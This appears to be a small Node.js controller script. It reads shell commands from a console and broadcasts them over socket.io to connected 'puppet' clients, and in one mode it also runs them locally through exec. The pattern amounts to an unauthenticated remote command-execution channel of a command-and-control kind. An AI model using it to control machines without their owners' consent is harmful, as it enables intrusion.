const { exec } = require('child_process');
const { io } = require("socket.io-client");
const socket = io("http://localhost:3000");
socket.on('connect', function () { 
  console.log("socket connected"); 
});
let mode:any;

const sendCmd = (e:any)=>{

    socket.emit('command', { cmd: e });

};
    const cmd = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
      });
    
      cmd.question(`enter 1 or 2 to impliment to everyone or client respectively: `, (req:any) => {
        if(req == 1 || req == 2){
                if(req == 1){
                    mode = 'sudo';
                    cmd.close();
                    root();
                    console.log('starving:');
                    
                }
                else{
                    mode = 'puppet';
                    cmd.close();
                    root();
                    console.log('starving:');
                }
        }
      });




const root = ()=>{

    const readline = require('readline').createInterface({

        input: process.stdin,
        output: process.stdout

      });
    
      readline.question(``, async (newline:any) => {

          if(mode == 'sudo'){
            try{
              exec(newline, (err:any, stdout:any, stderr:any)=>{
                  console.log(stdout);
                  if(stderr){
                      console.log(stderr);
                  }
              });
          }
          catch(err){
              console.log("INTERNAL ERROR: ", err);
          }

            sendCmd(newline)
          }

          else{

           sendCmd(newline)

          }
    
        readline.close();
        root()

      })
    
        
}

